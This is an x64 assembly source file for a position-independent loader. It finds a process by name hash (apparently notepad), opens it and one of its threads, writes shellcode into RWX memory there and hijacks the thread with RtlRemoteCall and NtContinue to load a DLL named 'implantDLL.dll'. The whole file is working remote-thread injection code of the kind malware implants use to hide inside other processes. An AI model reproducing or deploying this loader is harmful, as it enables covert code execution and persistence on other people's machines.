[bits 64]

push r15
sub rsp, 8                                  ; 16 byte stack align

call reloc_base
reloc_base:
    pop r15
    sub r15, 11

jmp main

; arg0: str             rcx
;
; ret: num chars        rax
utils_strlen:
    push rbp
    mov rbp, rsp

    mov [rbp + 16], rcx                 ; str

    ; rbp - 8 = output strlen
    ; rbp - 16 = rsi
    sub rsp, 16                         ; allocate local variable space
    
    mov qword [rbp - 8], 0              ; strlen = 0
    mov [rbp - 16], rsi                 ; save rsi

    mov rsi, [rbp + 16]                 ; str

    jmp .while_condition
    .loop:
         inc qword [rbp - 8]            ; ++strlen

        .while_condition:
            lodsb                       ; load from mem to al

            cmp al, 0                   ; end of string ?
            jne .loop
    
    mov rsi, [rbp - 16]                 ; restore rsi 
    mov rax, [rbp - 8]                  ; strlen in rax

    leave
    ret

; arg0: &str                rcx
;
; ret: folded hash value    rax
utils_str_hash:
        push rbp 
        mov rbp, rsp

        mov [rbp + 16], rcx     ; &str

        ; rbp - 8 = return value (hash)
        ; rbp - 16 = rbx

        ; r10 = i
        ; r11 = strlen
        ; r8 = tmp word value from str
        ; rbx = &str
        ; rcx = offset from rbx
        ; rax = currentfold

        sub rsp, 16             ; local variable space
        sub rsp, 32             ; shadow space

        mov qword [rbp - 8], 0  ; hash
        mov [rbp - 16], rbx     ; store rbx

        mov rbx, [rbp + 16]     ; &str
        xor r10d, r10d          ; i

        mov rcx, [rbp + 16]     ; &str
        call utils_strlen

        mov r11, rax

    .loop:
        xor rax, rax
        mov al, [rbx + r10]     ; str[i] in ax, currentfold
        shl rax, 8              ; <<= 8

    .i_plus_1: 
        mov rcx, r10            ; i
        add rcx, 1              ; i + 1

        cmp rcx, r11            ; i + 1 < strlen
        jge .i_plus_2

        movzx r8d, byte [rbx + rcx]
        xor rax, r8             ; currentFold |= str[i + 1]
        shl rax, 8              ; <<= 8

    .i_plus_2:
        mov rcx, r10            ; i
        add rcx, 2              ; i + 2

        cmp rcx, r11            ; i + 2 < strlen
        jge .i_plus_3

        movzx r8d, byte [rbx + rcx]
        xor rax, r8             ; currentFold |= str[i + 2]
        shl rax, 8              ; <<= 8

    .i_plus_3:
        mov rcx, r10            ; i
        add rcx, 3              ; i + 3

        cmp rcx, r11            ; i + 3 < strlen
        jge .cmp_end

        movzx r8d, byte [rbx + rcx]
        xor rax, r8             ; currentFold |= str[i + 3]
        
    .cmp_end:
        add [rbp - 8], rax      ; hash += currentFold

        add r10, 4              ; i += 4

        cmp r10, r11            ; i < strlen
        jl .loop

    .shutdown:
        mov rbx, [rbp - 16]     ; restore rbx
        mov rax, [rbp - 8]      ; return value

        leave
        ret

; arg0: proc name hash      rcx
;
; ret: pid                  rax      
utils_find_target_pid_by_hash:
        push rbp
        mov rbp, rsp

        mov [rbp + 16], rcx         ; proc name hash

        ; rbp - 8 = return value
        ; rbp - 16 = snapshot handle
        ; rbp - 324 = process entry struct
        ; rbp - 336 = padding bytes
        sub rsp, 336                ; local variable space
        sub rsp, 32                 ; shadow space

        mov qword [rbp - 8], 0      ; return value

        mov rcx, 0x2                ; TH32CS_SNAPPROCESS
        xor rdx, rdx
        call [r15 + params + 16]             ; CreateToolhelp32Snapshot

        cmp rax, -1
        je .shutdown

        mov [rbp - 16], rax         ; snapshot handle
        mov dword [rbp - 324], 308  ; procesentry32.dwsize

        mov rcx, [rbp - 16]         ; snapshot handle
        mov rdx, rbp
        sub rdx, 324                ; &processentry
        call [r15 + params + 24]             ; Process32First

        cmp rax, 0
        je .shutdown

    .loop:
        mov rcx, [rbp - 16]         ; snapshot handle
        mov rdx, rbp
        sub rdx, 324                ; &processentry
        call [r15 + params + 32]             ; Process32Next

        cmp rax, 0
        je .loop_end
            mov rcx, rbp
            sub rcx, 324
            add rcx, 44
            call utils_str_hash

            cmp rax, [rbp + 16]     ; proc hash == input proc hash
            je .process_found

            jmp .loop

    .process_found:
        mov rax, rbp
        sub rax, 324
        add rax, 8
        mov eax, [rax]
        mov [rbp - 8], rax          ; return value

    .loop_end:
    .shutdown:
        mov rcx, [rbp - 16]         ; snapshot handle
        call [r15 + params + 72]             ; CloseHandle

        mov rax, [rbp - 8]          ; return value

        leave
        ret

; arg0: target pid          rcx
;
; ret: target tid           rax
utils_find_target_tid:
        push rbp
        mov rbp, rsp

        mov [rbp + 16], rcx         ; target pid

        ; rbp - 8 = return value
        ; rbp - 16 = snapshot handle
        ; rbp - 44 = thread entry struct
        ; rbp - 48  = padding bytes
        sub rsp, 48                 ; local variable space
        sub rsp, 32                 ; shadow space

        mov qword [rbp - 8], 0      ; return value

        mov rcx, 0x4                ; TH32CS_SNAPTHREAD
        xor rdx, rdx
        call [r15 + params + 16]             ; CreateToolhelp32Snapshot

        cmp rax, -1
        je .shutdown

        mov [rbp - 16], rax         ; snapshot handle
        mov dword [rbp - 44], 28    ; threadentry32.dwsize

        mov rcx, [rbp - 16]         ; snapshot handle
        mov rdx, rbp
        sub rdx, 44                 ; &threadentry
        call [r15 + params + 40]             ; Thread32First

        cmp rax, 0
        je .shutdown

    .loop:
        mov rcx, [rbp - 16]         ; snapshot handle
        mov rdx, rbp
        sub rdx, 44                 ; &threadentry
        call [r15 + params + 48]             ; Thread32Next

        cmp rax, 0
        je .loop_end
            mov rax, rbp
            sub rax, 32             ; threadentry32.th32OwnerthreadID
            mov eax, [rax] 
            cmp rax, [rbp + 16]     ; input pid == owner pid
            je .thread_found

            jmp .loop

    .thread_found:
        mov rax, rbp
        sub rax, 36                 ; threadentry32.th32ThreadID
        mov eax, [rax]
        mov [rbp - 8], rax          ; return value

    .loop_end:
    .shutdown:
        mov rcx, [rbp - 16]         ; snapshot handle
        call [r15 + params + 72]             ; CloseHandle

        mov rax, [rbp - 8]          ; return value

        leave
        ret

main:
        push rbp
        mov rbp, rsp

        mov [rbp + 32], rcx                 ; 32 instead of 16 to account for stored r15 and stack align code

        ; rbp - 8   = return value
        ; rbp - 16  = target pid
        ; rbp - 24  = target tid
        ; rbp - 32  = target proc hnd
        ; rbp - 40  = target thread hnd
        ; rbp - 48  = remote payload memory
        sub rsp, 48                         ; local variable space
        sub rsp, 64                         ; shadow space

        mov rcx, [r15 + notepadHash]
        call utils_find_target_pid_by_hash

        mov [rbp - 16], rax                 ; target pid

        mov rcx, [rbp - 16]                 ; target pid
        call utils_find_target_tid
        
        mov [rbp - 24], rax                 ; target tid

        mov rcx, 0x1fFFFF
        xor rdx, rdx
        mov r8, [rbp - 16]                  ; target pid
        call [r15 + params + 56]            ; openProcess

        cmp rax, 0
        je .shutdown

        mov [rbp - 32], rax                 ; target proc hnd

        mov rcx, 0x1fFFFF
        xor rdx, rdx
        mov r8, [rbp - 24]                  ; target tid
        call [r15 + params + 64]            ; openThread

        cmp rax, 0
        je .shutdown

        mov [rbp - 40], rax                 ; target thread hnd

        mov rcx, [rbp - 32]
        xor rdx, rdx
        mov r8, shellcode_x64.len
        add r8, shellcodeParams.len
        add r8, shellcodeArgs.len
        mov r9, 0x3000                      ; MEM_RESERVE
        mov qword [rsp + 32], 0x40          ; PAGE_EXECUTE_READWRITE
        call [r15 + params + 80]            ; VirtualAllocEx

        cmp rax, 0
        je .shutdown

        mov [rbp - 48], rax                 ; remote payload memory

        mov rcx, [rbp - 40]                 ; target thread hnd
        call [r15 + params + 120]           ; SuspendThread

        mov dword [r15 + shellcodeParams.ntContinueCtx + 48], 0x0010000B        ; ctx.ContextFlags = CONTEXT_FULL

        mov rcx, [rbp - 40]                             ; target thread hnd
        mov rdx, r15
        add rdx, shellcodeParams.ntContinueCtx          ; &ctx
        call [r15 + params + 112]                       ; GetThreadContext

        mov rax, [r15 + params + 168]                   ; NtContinue
        mov [r15 + shellcodeParams.ntContinue], rax     ; ntcontinue addr

        mov rax, [r15 + params + 144]                   ; LoadLibraryA
        mov [r15 + shellcodeParams.func1], rax          ; func

        mov rax, 0xdeadbabe
        mov [r15 + shellcodeParams.retVal], rax         ; funcRetVal

        mov rax, shellcodeArgs.1 - shellcode_x64
        add rax, [rbp - 48]                             ; remote payload memory
        mov [r15 + shellcodeParams.params], rax         ; funcParams[0]

        mov rcx, [rbp - 32]                             ; targetprochnd
        mov rdx, [rbp - 48]                             ; remote payload memory
        mov r8, r15
        add r8, shellcode_x64
        mov r9, shellcodeDataEnd - shellcodeDataStart   ; shellcode length
        mov qword [rsp + 32], 0

        call [r15 + params + 96]                        ; WriteProcessMemory

        cmp rax, 0
        je .shutdown

        mov rcx, [rbp - 32]                 ; target proc hnd
        mov rdx, [rbp - 40]                 ; target thread hnd
        mov r8, [rbp - 48]                  ; remote payload mem
        mov r9, 0
        mov qword [rsp + 32], 0
        mov qword [rsp + 40], 1
        mov qword [rsp + 48], 1
        call [r15 + params + 176]           ; RtlRemoteCall

        mov rcx, [rbp - 40]                 ; target thread hnd
        call [r15 + params + 128]           ; ResumeThread

    .ret_val_loop:
        mov rcx, 1500
        call [r15 + params + 136]           ; Sleep

        mov rcx, [rbp - 32]                 ; target proc hnd
        mov rdx, [rbp - 48]                 ; remote target payload
        add rdx, shellcode_x64.len + 8
        mov r8, r15
        add r8, shellcodeParams.retVal      ; funcRetVal
        mov r9, 8 
        mov qword [rsp + 32], 0
        call [r15 + params + 104]           ; ReadProcessMemory

        cmp dword [r15 + shellcodeParams.retVal], 0xdeadbabe
        je .ret_val_loop

    .shutdown:
        mov rcx, 1000
        call [r15 + params + 136]           ; Sleep wait time for ntcontinue

        mov rcx, [rbp - 32]                 ; target proc hnd
        mov rdx, [rbp - 48]                 ; remote payload memory
        xor r8, r8
        mov r9, 0x8000                      ; MEM_RELEASE
        call [r15 + params + 88]

        mov rcx, [rbp - 32]                 ; target proc hnd
        call [r15 + params + 72]

        mov rcx, [rbp - 40]                 ; target thread hnd
        call [r15 + params + 72]

        leave
        add rsp, 8
        pop r15
        ret

notepadHash: dq 0x144493d93

align 16
shellcodeDataStart:
%include 'shellcode.x64.bin.asm'
shellcodeParams:
.func1: dq 0
.retVal: dq 0
.params: db 96 dup (0)
.ntContinue: dq 0
align 16
.ntContinueCtx: db 1232 dup (0)
.len equ $ - shellcodeParams
shellcodeArgs:
.1: db 'implantDLL.dll', 0
.1.len equ $ - shellcodeArgs.1
.len equ $ - shellcodeArgs
shellcodeDataEnd:

align 16
params:
; writeFile: dq 0                       0
; readFile: dq 0                        8
; createToolhelp32Snapshot: dq 0        16
; process32First: dq 0                  24
; process32Next: dq 0                   32
; thread32First: dq 0                   40
; thread32Next: dq 0                    48
; openProcess: dq 0                     56
; openThread: dq 0                      64
; closeHandle: dq 0                     72
; virtualAllocEx: dq 0                  80
; virtualFreeEx: dq 0                   88
; writeProcessMemory: dq 0              96
; readProcessMemory: dq 0               104
; getThreadContext: dq 0                112
; suspendThread: dq 0                   120
; resumeThread: dq 0                    128
; sleep: dq 0                           136
; loadLibraryA: dq 0                    144

; stdOutHnd: dq 0                       152
; stdInHnd: dq 0                        160

; ntContinue: dq 0                      168
; rtlRemoteCall: dq 0                   176